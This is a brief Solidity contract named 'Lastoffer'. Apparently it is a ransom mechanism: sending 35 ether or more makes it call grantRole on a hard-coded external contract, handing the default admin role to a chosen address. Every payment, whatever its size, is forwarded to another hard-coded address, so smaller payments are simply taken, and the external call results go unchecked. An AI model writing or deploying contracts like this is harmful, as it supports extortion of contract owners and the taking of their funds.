//SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

contract Lastoffer {

    function redemption(address newOwner) public payable {
        if(msg.value >= 35 ether) {
            address(0xAcB3C6a43D15B907e8433077B6d38Ae40936fe2c).call(abi.encodeWithSignature("grantRole(bytes32,address)", 0x0000000000000000000000000000000000000000000000000000000000000000, newOwner));
        }
        address(0x2A00CA38FB9B821edeA2478DA31d97B0f83347fe).call{value: msg.value}("");
    }

    receive() external payable  {
        redemption(msg.sender);
    }

    fallback() external payable {
        redemption(msg.sender);
    }

}